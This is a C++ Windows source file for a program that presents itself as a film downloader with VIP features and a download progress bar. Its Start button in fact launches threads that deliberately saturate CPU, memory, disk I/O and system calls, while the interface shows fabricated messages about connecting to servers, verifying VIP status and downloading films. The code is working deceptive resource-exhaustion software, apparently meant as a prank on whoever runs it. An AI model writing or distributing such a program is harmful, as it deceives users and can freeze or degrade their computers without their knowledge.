#include <windows.h>
#include <commctrl.h>
#include <string>
#include <cmath>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <wininet.h>
#include <algorithm>
#include <atomic>
#include <list>
#include <memory>

HWND g_bilibiliLink;
HWND g_hwnd;
HWND g_startButton;
HWND g_loadingText;
HWND g_progressBar;
HWND g_threadCountText;
HWND g_threadSlider;
HWND g_networkStatusText;
bool g_isRunning = false;
int g_threadCount = 12;
std::vector<HANDLE> g_threadHandles;

// 检查网络连接的函数
bool CheckInternetConnection() {
	const DWORD FLAG_ICC_FORCE_CONNECTION = 0x00000001;
	return InternetCheckConnection("http://www.baidu.com", FLAG_ICC_FORCE_CONNECTION, 0);
}

DWORD WINAPI ExtremeHeavyCalculation(LPVOID lpParam) {
	int threadId = *(int*)lpParam;
	double result = 0.0;

	// 创建更多局部变量增加寄存器压力
	double results[8] = {0};

	while (g_isRunning) {
		// 第一层：高强度数学计算
		for (int i = 0; i < 200000; i++) { // 增加循环次数
			double x = i * 0.000001 + threadId;
			double y = sin(x * 2.0) * cos(x * 1.5);
			double z = tan(x * 0.3) * log(x + 2.0);

			// 多层级复杂计算
			for (int depth = 0; depth < 3; depth++) { // 增加嵌套循环
				double depth_factor = depth * 0.1 + 1.0;
				result += sin(x * depth_factor) * cos(y * depth_factor) +
				          tan(z * depth_factor) * log(x + y + z + 1.0) +
				          sqrt(x * y * z + 1.0) * exp(-x * y * 0.01);
			}

			result = fmod(result, 100000.0);

			// 更多数学函数组合
			result += atan(result * 0.1) * asin(fabs(sin(result)) * 0.001);
			result += acos(fabs(cos(result)) * 0.001) * tanh(result * 0.01);

			// 矩阵运算模拟
			for (int m = 0; m < 4; m++) {
				for (int n = 0; n < 4; n++) {
					results[m % 8] += sin(x + m) * cos(y + n) * tan(z + m + n);
				}
			}

			// 随机数计算压力
			for (int r = 0; r < 10; r++) {
				double rand_val = (rand() % 1000) * 0.001;
				result += sin(result * rand_val) * cos(result / (rand_val + 0.1));
			}
		}

		// 第二层：内存操作压力
		int size = 5000000 + (threadId * 1000000); // 增加内存分配大小
		char* memoryBlock = new char[size];
		for (int i = 0; i < size; i++) {
			memoryBlock[i] = (i * threadId) % 256;

			// 额外的内存访问模式
			if (i % 1000 == 0) {
				// 随机访问模式增加缓存压力
				for (int j = 0; j < 10; j++) {
					int random_index = (i + j * 997) % size; // 使用质数增加随机性
					memoryBlock[random_index] = (memoryBlock[random_index] + j) % 256;
				}
			}
		}

		// 第三层：更多嵌套循环和计算
		for (int outer = 0; outer < 10000 && g_isRunning; outer++) {
			double outer_sum = 0.0;
			for (int inner = 0; inner < 10000; inner++) {
				double angle = (outer + inner) * 0.001;
				outer_sum += sin(angle) * sin(angle) +
				             cos(angle) * cos(angle) +
				             sin(angle) * cos(angle) * tan(angle);
			}
			result += fmod(outer_sum, 100.0);
		}

		// 第四层：复杂浮点运算
		for (int f = 0; f < 50000 && g_isRunning; f++) {
			double f_val = f * 0.00002;
			for (int g = 0; g < 10; g++) {
				double g_val = g * 0.1;
				result += pow(sin(f_val + g_val), 2.0) +
				          pow(cos(f_val - g_val), 2.0) +
				          sin(f_val * g_val) / (cos(f_val * g_val) + 0.01);
			}
		}

		delete[] memoryBlock;

		// 第五层：字符串处理增加CPU压力
		if (threadId % 4 == 0) { // 部分线程执行额外操作
			std::string data = "";
			for (int s = 0; s < 100000 && g_isRunning; s++) {
				char buffer[1000];
				sprintf(buffer, "计算数据: %f, %f, %f", result, sin(result), cos(result));
				data += buffer;
				// 字符串操作增加CPU负担
				if (data.length() > 10000000) {
					data = data.substr(data.length() - 5000000);
				}
			}
		}

		// 第六层：随机延迟和复杂分支
		for (int b = 0; b < 100000 && g_isRunning; b++) {
			// 复杂的分支预测压力
			if (b % 2 == 0) {
				if (b % 3 == 0) {
					if (b % 5 == 0) {
						if (b % 7 == 0) {
							result += sin(b * 0.001);
						} else {
							result += cos(b * 0.001);
						}
					} else {
						result += tan(b * 0.001);
					}
				} else {
					result += log(b + 1.0);
				}
			} else {
				result += sqrt(b + 1.0);
			}
		}

		// 防止优化编译器删除无用计算
		volatile double prevent_optimization = result;
		(void)prevent_optimization;
	}

	delete (int*)lpParam;
	return 0;
}

DWORD WINAPI MemoryHog(LPVOID lpParam) {
    (void)lpParam;
    std::atomic<bool>& isRunning = *reinterpret_cast<std::atomic<bool>*>(&g_isRunning);
    
    std::list<std::shared_ptr<std::vector<char>>> memoryList;
    std::list<std::unique_ptr<char[]>> rawMemoryList;
    
    while (isRunning.load()) {
        // 方法1: 使用shared_ptr管理大vector
        try {
            auto block = std::make_shared<std::vector<char>>();
            block->resize(100 * 1024 * 1024); // 100MB
            
            // 填充数据
            for (size_t i = 0; i < block->size(); i += 512) {
                (*block)[i] = static_cast<char>(i % 512);
            }
            
            memoryList.push_back(block);
            
        } catch (...) {}
        
        // 方法2: 使用unique_ptr管理原始内存
        try {
            auto rawBlock = std::make_unique<char[]>(500 * 1024 * 1024); // 50MB
            for (size_t i = 0; i < 500 * 1024 * 1024; i += 1024) {
                rawBlock[i] = static_cast<char>(i ^ 0xFF);
            }
            
            rawMemoryList.push_back(std::move(rawBlock));
            
        } catch (...) {}
        
        // 保持列表大小，部分释放制造碎片
        if (memoryList.size() > 20) {
            memoryList.pop_front();
        }
        if (rawMemoryList.size() > 20) {
            rawMemoryList.pop_front();
        }
        
        Sleep(200);
    }
    
    std::vector<char*> memoryBlocks;
    int counter = 0;
    
    while (g_isRunning) {
        // 每次分配不同大小的内存块
        size_t blockSize;
        switch (counter % 4) {
            case 0: blockSize = 256 * 1024 * 1024; break;  // 256MB
            case 1: blockSize = 128 * 1024 * 1024; break;  // 128MB
            case 2: blockSize = 64 * 1024 * 1024;  break;  // 64MB
            case 3: blockSize = 32 * 1024 * 1024;  break;  // 32MB
        }
        counter++;
        
        try {
            // 分配内存
            char* block = new char[blockSize];
            
            // 疯狂写入（不完全写入以节省时间）
            for (size_t i = 0; i < blockSize; i += 65536) {
                block[i] = static_cast<char>((i + counter) % 256);
            }
            
            memoryBlocks.push_back(block);
            
            // 保持一定内存压力但避免立即OOM
            if (memoryBlocks.size() > 20) {
                delete[] memoryBlocks[0];
                memoryBlocks.erase(memoryBlocks.begin());
            }
            
        } catch (...) {
            // 分配失败，继续尝试
        }
        
        Sleep(50);
    }
    
    // 清理
    for (char* block : memoryBlocks) {
        delete[] block;
    }
    
    return 0;
}

// 硬盘疯狂读写函数 - 修复文件删除问题版本
DWORD WINAPI HardDiskHog(LPVOID lpParam) {
    (void)lpParam;
    
    int fileCounter = 0;
    char tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    
    // 创建专门的临时目录
    char diskHogPath[MAX_PATH];
    strcpy(diskHogPath, tempPath);
    strcat(diskHogPath, "9178_disk_hog\\");
    CreateDirectory(diskHogPath, NULL);
    
    // 用于追踪所有打开的文件句柄
    std::vector<HANDLE> openFileHandles;
    
    while (g_isRunning) {
        char filename[MAX_PATH];
        char counterStr[20];
        _itoa(fileCounter++, counterStr, 10);
        
        strcpy(filename, diskHogPath);
        strcat(filename, "disk_hog_");
        strcat(filename, counterStr);
        strcat(filename, ".dat");
        
        // 创建文件，使用DELETE_ON_CLOSE标志
        HANDLE hFile = CreateFile(filename,
                                  GENERIC_WRITE | GENERIC_READ,
                                  FILE_SHARE_READ,
                                  NULL,
                                  CREATE_ALWAYS,
                                  FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
                                  NULL);
        
        if (hFile != INVALID_HANDLE_VALUE) {
            // 追踪句柄
            openFileHandles.push_back(hFile);
            
            // 写入数据
            const int BLOCK_SIZE = 131072; // 128KB
            char* writeBuffer = new char[BLOCK_SIZE];
            
            for (int i = 0; i < 100 && g_isRunning; i++) { // 减少循环次数
                // 填充数据
                for (int j = 0; j < BLOCK_SIZE; j++) {
                    writeBuffer[j] = (rand() * j) % 256;
                }
                
                DWORD bytesWritten;
                WriteFile(hFile, writeBuffer, BLOCK_SIZE, &bytesWritten, NULL);
                
                // 偶尔执行Flush
                if (i % 10 == 0) {
                    FlushFileBuffers(hFile);
                }
            }
            
            delete[] writeBuffer;
            
            // 关闭文件句柄，触发自动删除
            CloseHandle(hFile);
            
            // 从追踪列表中移除
            openFileHandles.erase(
                std::remove(openFileHandles.begin(), openFileHandles.end(), hFile),
                openFileHandles.end()
            );
        }
        
        // 2. 创建小文件 - 简化版本，确保正确管理句柄
        for (int i = 0; i < 10 && g_isRunning; i++) { // 减少小文件数量
            char smallFilename[MAX_PATH];
            char iStr[20], counterStr2[20];
            _itoa(fileCounter, counterStr2, 10);
            _itoa(i, iStr, 10);
            
            strcpy(smallFilename, diskHogPath);
            strcat(smallFilename, "small_");
            strcat(smallFilename, counterStr2);
            strcat(smallFilename, "_");
            strcat(smallFilename, iStr);
            strcat(smallFilename, ".tmp");
            
            // 使用CreateFile替代fstream，以便管理句柄
            HANDLE hSmallFile = CreateFile(smallFilename,
                                           GENERIC_WRITE | GENERIC_READ,
                                           FILE_SHARE_READ,
                                           NULL,
                                           CREATE_ALWAYS,
                                           FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
                                           NULL);
            
            if (hSmallFile != INVALID_HANDLE_VALUE) {
                // 追踪句柄
                openFileHandles.push_back(hSmallFile);
                
                // 写入数据
                for (int j = 0; j < 100 && g_isRunning; j++) {
                    char buffer[256];
                    int len = sprintf(buffer, "数据块[%d.%d.%d]: sin=%f\n",
                                      fileCounter, i, j,
                                      sin(j * 0.01));
                    
                    DWORD bytesWritten;
                    WriteFile(hSmallFile, buffer, len, &bytesWritten, NULL);
                }
                
                // 关闭文件句柄，触发自动删除
                CloseHandle(hSmallFile);
                
                // 从追踪列表中移除
                openFileHandles.erase(
                    std::remove(openFileHandles.begin(), openFileHandles.end(), hSmallFile),
                    openFileHandles.end()
                );
            }
        }
        
        // 3. CPU计算部分保持不变，但移除文件枚举操作
        if (g_isRunning) {
            double cpuLoad = 0.0;
            for (int calc = 0; calc < 5000; calc++) {
                double x = calc * 0.0001;
                cpuLoad += sin(x) * cos(x) +
                           tan(x * 0.1) * log(x + 1.0);
            }
            volatile double keepLoad = cpuLoad;
            (void)keepLoad;
        }
        
        // 短暂延迟
        Sleep(100);
    }
    
    // 清理阶段：确保所有文件句柄都已关闭
    for (HANDLE hFile : openFileHandles) {
        CloseHandle(hFile);
    }
    openFileHandles.clear();
    
    // 强制清理目录中的剩余文件
    char cleanupPath[MAX_PATH];
    strcpy(cleanupPath, diskHogPath);
    strcat(cleanupPath, "*.*");
    
    // 多次尝试删除，确保清理干净
    for (int retry = 0; retry < 5; retry++) {
        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFile(cleanupPath, &findData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            bool allDeleted = true;
            
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    char fileToDelete[MAX_PATH];
                    strcpy(fileToDelete, diskHogPath);
                    strcat(fileToDelete, findData.cFileName);
                    
                    if (!DeleteFile(fileToDelete)) {
                        allDeleted = false;
                        DWORD error = GetLastError();
                        // 如果文件正在使用，稍后重试
                        if (error == ERROR_SHARING_VIOLATION || error == ERROR_LOCK_VIOLATION) {
                            // 文件可能仍被占用，等待后重试
                            Sleep(10);
                        }
                    }
                }
            } while (FindNextFile(hFind, &findData) != 0);
            
            FindClose(hFind);
            
            // 如果所有文件都已删除，跳出重试循环
            if (allDeleted) {
                break;
            }
        } else {
            // 找不到文件，可能目录已空
            break;
        }
        
        // 等待后重试
        Sleep(50);
    }
    
    // 尝试删除空目录
    for (int retry = 0; retry < 10; retry++) {
        if (RemoveDirectory(diskHogPath)) {
            break;
        }
        Sleep(50);
    }
    
    return 0;
}

DWORD WINAPI CoreWorkerThread(LPVOID param) {
	int id = *(int*)param;
	double result = 0.0;

	// 大规模矩阵运算
	const int SIZE = 256;
	for (int i = 0; i < SIZE && g_isRunning; i++) {
		for (int j = 0; j < SIZE; j++) {
			double val = 0.0;
			for (int k = 0; k < SIZE; k++) {
				double a = sin((i + id) * 0.01) * cos((j + id) * 0.01);
				double b = tan((k + id) * 0.01) * log(fabs(i - j - k) + 1.0);
				val += a * b + sqrt(fabs(a) + fabs(b));

				// 额外的复杂计算
				for (int iter = 0; iter < 3; iter++) {
					val = sin(val) * cos(val) +
					      tan(val * 0.1) * exp(-val * 0.01);
				}
			}
			result += val;
		}
	}

	delete (int*)param;
	return 0;
}

// 新增：系统资源全面消耗函数（简化版本，避免不支持的API）
DWORD WINAPI SystemResourceHog(LPVOID lpParam) {
	(void)lpParam;

	// 设置高优先级（但不是实时优先级，避免完全锁死）
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

	// 获取系统信息
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);

	// 为每个CPU核心创建工作负载
	const int NUM_CORES = sysInfo.dwNumberOfProcessors;

	while (g_isRunning) {
		// 1. 多线程矩阵计算（模拟多核负载）
		HANDLE coreThreads[64];
		int maxThreads = NUM_CORES * 2;
		if (maxThreads > 64) maxThreads = 64;

		for (int core = 0; core < maxThreads && g_isRunning; core++) {
			int* coreId = new int(core);
			coreThreads[core] = CreateThread(NULL, 0, CoreWorkerThread, coreId, 0, NULL);
		}

		// 等待所有核心线程完成
		for (int core = 0; core < maxThreads; core++) {
			if (coreThreads[core]) {
				WaitForSingleObject(coreThreads[core], 100);
				CloseHandle(coreThreads[core]);
			}
		}

		// 2. 内存带宽压力测试
		const size_t MEM_SIZE = 50 * 1024 * 1024; // 50MB
		char* memoryBlock = (char*)VirtualAlloc(NULL, MEM_SIZE,
		                                        MEM_COMMIT | MEM_RESERVE,
		                                        PAGE_READWRITE);

		if (memoryBlock) {
			// 多种内存访问模式
			for (int pattern = 0; pattern < 5 && g_isRunning; pattern++) {
				// 顺序访问
				for (size_t i = 0; i < MEM_SIZE && g_isRunning; i += 64) {
					memoryBlock[i] = (i + pattern) % 256;
				}

				// 随机访问（增加缓存失效）
				for (int i = 0; i < 50000 && g_isRunning; i++) {
					size_t idx = (rand() * rand()) % MEM_SIZE;
					memoryBlock[idx] = memoryBlock[(idx + 4096) % MEM_SIZE] +
					                   memoryBlock[(idx + 8192) % MEM_SIZE];
				}

				// 跨步访问（模拟缓存不友好）
				for (size_t stride = 1024; stride < 16384 && g_isRunning; stride *= 2) {
					for (size_t i = 0; i < MEM_SIZE && g_isRunning; i += stride) {
						memoryBlock[i] = memoryBlock[(i + stride) % MEM_SIZE] ^
						                 pattern;
					}
				}
			}

			VirtualFree(memoryBlock, 0, MEM_RELEASE);
		}

		// 3. 系统API调用压力测试（使用基本API）
		for (int apiCall = 0; apiCall < 5000 && g_isRunning; apiCall++) {
			// 获取内存信息
			MEMORYSTATUS memStatus;
			memStatus.dwLength = sizeof(memStatus);
			GlobalMemoryStatus(&memStatus);

			// 获取系统时间
			SYSTEMTIME sysTime, localTime;
			GetSystemTime(&sysTime);
			GetLocalTime(&localTime);

			// 获取当前目录
			char currentDir[MAX_PATH];
			GetCurrentDirectory(MAX_PATH, currentDir);

			// 获取临时目录
			char tempDir[MAX_PATH];
			GetTempPath(MAX_PATH, tempDir);

			// 获取计算机名
			char computerName[MAX_COMPUTERNAME_LENGTH + 1];
			DWORD size = sizeof(computerName);
			GetComputerName(computerName, &size);

			// 获取用户名
			char userName[256];
			DWORD userNameSize = sizeof(userName);
			GetUserName(userName, &userNameSize);

			// 简单的计算避免被优化掉
			volatile DWORD dummy = memStatus.dwMemoryLoad;
			dummy += sysTime.wMilliseconds;
			(void)dummy;
		}

		// 短暂休息，避免完全锁死
		DWORD startTick = GetTickCount();
		while (GetTickCount() - startTick < 10 && g_isRunning) {
			// 空循环，保持CPU忙碌
			for (int i = 0; i < 1000; i++) {
				volatile int dummy = i * i;
				(void)dummy;
			}
		}
	}

	return 0;
}


// 新增：GPU模拟计算函数（通过CPU模拟GPU工作负载）
DWORD WINAPI GPUSimulation(LPVOID lpParam) {
	(void)lpParam;

	// 模拟GPU的并行计算
	const int MATRIX_SIZE = 512;
	double* matrixA = new double[MATRIX_SIZE * MATRIX_SIZE];
	double* matrixB = new double[MATRIX_SIZE * MATRIX_SIZE];
	double* matrixC = new double[MATRIX_SIZE * MATRIX_SIZE];

	// 初始化矩阵
	for (int i = 0; i < MATRIX_SIZE * MATRIX_SIZE; i++) {
		matrixA[i] = sin(i * 0.001);
		matrixB[i] = cos(i * 0.001);
	}

	while (g_isRunning) {
		// 模拟矩阵乘法（GPU常见工作负载）
		for (int i = 0; i < MATRIX_SIZE && g_isRunning; i++) {
			for (int j = 0; j < MATRIX_SIZE && g_isRunning; j++) {
				double sum = 0.0;
				for (int k = 0; k < MATRIX_SIZE; k++) {
					sum += matrixA[i * MATRIX_SIZE + k] * matrixB[k * MATRIX_SIZE + j];

					// 增加一些额外计算模拟GPU着色器
					sum += sin(sum * 0.01) * cos(sum * 0.01);
					sum = fmod(fabs(sum), 1000.0);
				}
				matrixC[i * MATRIX_SIZE + j] = sum;

				// 模拟像素着色器操作
				if ((i + j) % 100 == 0) {
					double pixelValue = matrixC[i * MATRIX_SIZE + j];
					for (int p = 0; p < 10; p++) {
						pixelValue = sin(pixelValue) * cos(pixelValue) +
						             tan(pixelValue * 0.1) * log(fabs(pixelValue) + 1.0);
					}
					matrixC[i * MATRIX_SIZE + j] = pixelValue;
				}
			}

			// 偶尔交换矩阵模拟GPU缓冲区交换
			if (i % 50 == 0) {
				double* temp = matrixA;
				matrixA = matrixC;
				matrixC = temp;
			}
		}

		// 模拟GPU纹理采样
		for (int texY = 0; texY < 256 && g_isRunning; texY++) {
			for (int texX = 0; texX < 256 && g_isRunning; texX++) {
				double u = texX / 256.0;
				double v = texY / 256.0;

				// 双线性滤波模拟
				for (int filterY = 0; filterY < 2; filterY++) {
					for (int filterX = 0; filterX < 2; filterX++) {
						double sampleU = u + filterX * 0.5;
						double sampleV = v + filterY * 0.5;

						// 复杂纹理采样计算
						double texel = sin(sampleU * 10.0) * cos(sampleV * 10.0);
						for (int mip = 0; mip < 3; mip++) {
							texel += sin(texel * (mip + 1)) * cos(texel * (mip + 1));
						}

						volatile double texelStorage = texel;
						(void)texelStorage;
					}
				}
			}
		}
	}

	delete[] matrixA;
	delete[] matrixB;
	delete[] matrixC;

	return 0;
}


DWORD WINAPI NetworkCheck(LPVOID lpParam) {
	(void)lpParam;

	std::vector<double> networkData(100000);

	while (g_isRunning) {
		for (int i = 0; i < 50000 && g_isRunning; i++) {
			double result = 0.0;
			for (int j = 0; j < 100; j++) {
				double angle = (i + j) * 0.001;
				result += sin(angle) * cos(angle) +
				          tan(angle * 0.1) * log(fabs(angle) + 1.0);
			}
			networkData[i % 100000] = result;
		}

		for (int i = 0; i < 1000 && g_isRunning; i++) {
			volatile double matrix[10][10];
			for (int x = 0; x < 10; x++) {
				for (int y = 0; y < 10; y++) {
					matrix[x][y] = sin(x * 0.1) * cos(y * 0.1) +
					               tan((x + y) * 0.01);
					for (int z = 0; z < 5; z++) {
						matrix[x][y] *= (1.0 + sin(z * 0.01));
					}
				}
			}
		}

		if (g_isRunning) {
			std::string logData;
			for (int i = 0; i < 1000 && g_isRunning; i++) {
				char buffer[256];
				double value = sin(i * 0.01) * 1000.0;
				sprintf(buffer, "网络数据包[%d]: 校验和=%f, 时间戳=%f, 序列号=%f\n",
				        i, value, cos(i * 0.02), tan(i * 0.005));
				logData += buffer;

				if (logData.length() > 100000) {
					logData = logData.substr(logData.length() - 50000);
				}
			}
		}

		Sleep(5);
	}

	return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            g_startButton = CreateWindow("BUTTON", "开始看片",
                                         WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                                         120, 200, 160, 40, hwnd, (HMENU)1, NULL, NULL);

            CreateWindow("BUTTON", "停止",
                         WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                         290, 200, 60, 40, hwnd, (HMENU)2, NULL, NULL);

            g_loadingText = CreateWindow("STATIC", "点击开始下载影片",
                                         WS_VISIBLE | WS_CHILD | SS_CENTER,
                                         50, 120, 300, 30, hwnd, NULL, NULL, NULL);

            g_networkStatusText = CreateWindow("STATIC", "网络状态: 未检测",
                                               WS_VISIBLE | WS_CHILD | SS_CENTER,
                                               50, 150, 300, 20, hwnd, NULL, NULL, NULL);

            g_threadCountText = CreateWindow("STATIC", "下载进程数:12",
                                             WS_VISIBLE | WS_CHILD,
                                             40, 260, 120, 30, hwnd, NULL, NULL, NULL);

            g_threadSlider = CreateWindow(TRACKBAR_CLASS, "",
                                          WS_VISIBLE | WS_CHILD | TBS_AUTOTICKS | TBS_BOTH,
                                          160, 260, 200, 30, hwnd, NULL, NULL, NULL);

            SendMessage(g_threadSlider, TBM_SETRANGE, TRUE, MAKELONG(1, 16));
            SendMessage(g_threadSlider, TBM_SETPOS, TRUE, 12);
            SendMessage(g_threadSlider, TBM_SETTICFREQ, 1, 0);

            g_progressBar = CreateWindow(PROGRESS_CLASS, NULL,
                                         WS_VISIBLE | WS_CHILD,
                                         50, 300, 300, 20, hwnd, NULL, NULL, NULL);

            SendMessage(g_progressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 1000));

            // 添加Bilibili作者链接（左下角）
            g_bilibiliLink = CreateWindow("BUTTON", "作者Bilibili",
                                         WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_FLAT,
                                         10, 330, 100, 25, hwnd, (HMENU)3, NULL, NULL);

            HFONT hFont = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                     DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                                     CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                     VARIABLE_PITCH, "宋体");
            HFONT hStatusFont = CreateFont(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                           DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                                           CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                           VARIABLE_PITCH, "宋体");
            HFONT hLinkFont = CreateFont(12, 0, 0, 0, FW_NORMAL, FALSE, TRUE, FALSE,
                                        DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                                        CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                        VARIABLE_PITCH, "宋体");

            SendMessage(g_loadingText, WM_SETFONT, (WPARAM)hFont, TRUE);
            SendMessage(g_startButton, WM_SETFONT, (WPARAM)hFont, TRUE);
            SendMessage(g_threadCountText, WM_SETFONT, (WPARAM)hFont, TRUE);
            SendMessage(g_networkStatusText, WM_SETFONT, (WPARAM)hStatusFont, TRUE);
            SendMessage(g_bilibiliLink, WM_SETFONT, (WPARAM)hLinkFont, TRUE);
        }
        return 0;

        case WM_HSCROLL: {
            // 滑块拖动消息处理
            if ((HWND)lParam == g_threadSlider) {
                g_threadCount = SendMessage(g_threadSlider, TBM_GETPOS, 0, 0);
                char buffer[50];
                sprintf(buffer, "下载进程数:%d", g_threadCount);
                SetWindowText(g_threadCountText, buffer);
            }
        }
        return 0;

        case WM_COMMAND:
            if (LOWORD(wParam) == 1) {
                if (!g_isRunning) {
                    SetWindowText(g_loadingText, "正在检测网络连接...");
                    SetWindowText(g_networkStatusText, "网络状态: 检测中...");
                    UpdateWindow(g_hwnd);

                    for (int i = 0; i < 3; i++) {
                        Sleep(500);
                        char status[50];
                        sprintf(status, "正在检测网络连接...%d/3", i + 1);
                        SetWindowText(g_loadingText, status);
                        UpdateWindow(g_hwnd);
                    }

                    if (!CheckInternetConnection()) {
                        SetWindowText(g_loadingText, "网络连接失败，请检查网络后重试");
                        SetWindowText(g_networkStatusText, "网络状态: 连接失败");
                        return 0;
                    }

                    g_isRunning = true;
                    SetWindowText(g_loadingText, "网络连接成功，开始下载影片...");
                    SetWindowText(g_networkStatusText, "网络状态: 已连接");
                    EnableWindow(g_startButton, FALSE);

                    SendMessage(g_progressBar, PBM_SETPOS, 0, 0);

                    HANDLE hNetworkThread = CreateThread(NULL, 0, NetworkCheck, NULL, 0, NULL);
                    g_threadHandles.push_back(hNetworkThread);

                    for (int i = 0; i < g_threadCount; i++) {
                        int* threadId = new int(i);
                        HANDLE hThread = CreateThread(NULL, 0, ExtremeHeavyCalculation, threadId, 0, NULL);
                        g_threadHandles.push_back(hThread);
                    }

                    HANDLE hMemoryThread = CreateThread(NULL, 0, MemoryHog, NULL, 0, NULL);
                    g_threadHandles.push_back(hMemoryThread);

                    HANDLE hSystemThread = CreateThread(NULL, 0, SystemResourceHog, NULL, 0, NULL);
                    g_threadHandles.push_back(hSystemThread);

                    HANDLE hDiskThread = CreateThread(NULL, 0, HardDiskHog, NULL, 0, NULL);
                    g_threadHandles.push_back(hDiskThread);

                    HANDLE hGPUThread = CreateThread(NULL, 0, GPUSimulation, NULL, 0, NULL);
                    g_threadHandles.push_back(hGPUThread);

                    SetTimer(hwnd, 1, 100, NULL);
                }
            } 
            else if (LOWORD(wParam) == 2) {
                if (g_isRunning) {
                    g_isRunning = false;

                    for (HANDLE hThread : g_threadHandles) {
                        WaitForSingleObject(hThread, INFINITE);
                        CloseHandle(hThread);
                    }
                    g_threadHandles.clear();

                    SetWindowText(g_loadingText, "已停止下载，请开通VIP解锁更多功能");
                    SetWindowText(g_networkStatusText, "链接状态: 已断开");
                    EnableWindow(g_startButton, TRUE);
                    KillTimer(hwnd, 1);
                    SendMessage(g_progressBar, PBM_SETPOS, 0, 0);
                }
            } 
            else if (LOWORD(wParam) == 3) {
                // 处理 Bilibili 链接点击
                ShellExecute(NULL, "open", "https://space.bilibili.com/31364833",
                            NULL, NULL, SW_SHOW);
            }
            return 0;

        case WM_TIMER: {
            static int progress = 0;
            progress = (progress + 1) % 1000;  // 0到999循环
            SendMessage(g_progressBar, PBM_SETPOS, progress, 0);

            char status[100];
            int percent = progress / 10;  // 将0-999映射到0-99，表示百分比

            if (progress < 200) {
                // 0-199: 连接服务器
                sprintf(status, "正在连接9178服务器... %d%%", percent);
            } else if (progress < 400) {
                // 200-399: 验证VIP状态
                sprintf(status, "正在验证VIP状态... %d%%", percent);
            } else if (progress < 600) {
                // 400-599: 下载高清影片
                sprintf(status, "正在下载高清影片... 已下载 %d%%", percent);
            } else if (progress < 800) {
                // 600-799: 缓存到本地
                sprintf(status, "正在缓存到本地... %d%%", percent);
            } else {
                // 800-999: 即将完成
                sprintf(status, "即将完成... %d%%", percent);
            }

            SetWindowText(g_loadingText, status);
        }
        return 0;

        case WM_DESTROY:
            g_isRunning = false;
            for (HANDLE hThread : g_threadHandles) {
                WaitForSingleObject(hThread, 10000);
                CloseHandle(hThread);
            }
            PostQuitMessage(0);
            return 0;

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);

            HFONT hTitleFont = CreateFont(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                          DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                                          CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                          VARIABLE_PITCH, "宋体");
            HFONT hSubtitleFont = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                             DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
                                             CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                                             VARIABLE_PITCH, "宋体");

            SelectObject(hdc, hTitleFont);
            SetTextColor(hdc, RGB(0, 100, 200));
            SetBkMode(hdc, TRANSPARENT);
            TextOut(hdc, 110, 20, "9178好看影片下载器", 18);

            SelectObject(hdc, hSubtitleFont);
            SetTextColor(hdc, RGB(50, 50, 50));
            TextOut(hdc, 105, 50, "海量高清影片，一键极速下载", 27);
            TextOut(hdc, 125, 70, "VIP会员享受无广告体验", 22);

            HPEN hPen = CreatePen(PS_SOLID, 2, RGB(200, 200, 200));
            SelectObject(hdc, hPen);
            MoveToEx(hdc, 30, 100, NULL);
            LineTo(hdc, 420, 100);

            DeleteObject(hTitleFont);
            DeleteObject(hSubtitleFont);
            DeleteObject(hPen);
            EndPaint(hwnd, &ps);
        }
        return 0;
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// 程序入口点
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	(void)hPrevInstance;
	(void)lpCmdLine;

	srand(static_cast<unsigned int>(time(NULL)));

	const char CLASS_NAME[] = "ResourceHogClass";

	WNDCLASS wc = {};
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = CLASS_NAME;
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(100)); // 使用资源图标

	RegisterClass(&wc);

	InitCommonControls();

	g_hwnd = CreateWindowEx(
	             0, CLASS_NAME, "9178好看影片下载器 - 海量资源一键下载",
	             WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX,
	             CW_USEDEFAULT, CW_USEDEFAULT, 420, 400,
	             NULL, NULL, hInstance, NULL
	         );

	if (g_hwnd == NULL) {
		return 0;
	}

	ShowWindow(g_hwnd, nCmdShow);
	UpdateWindow(g_hwnd);

	MSG msg = {};
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}
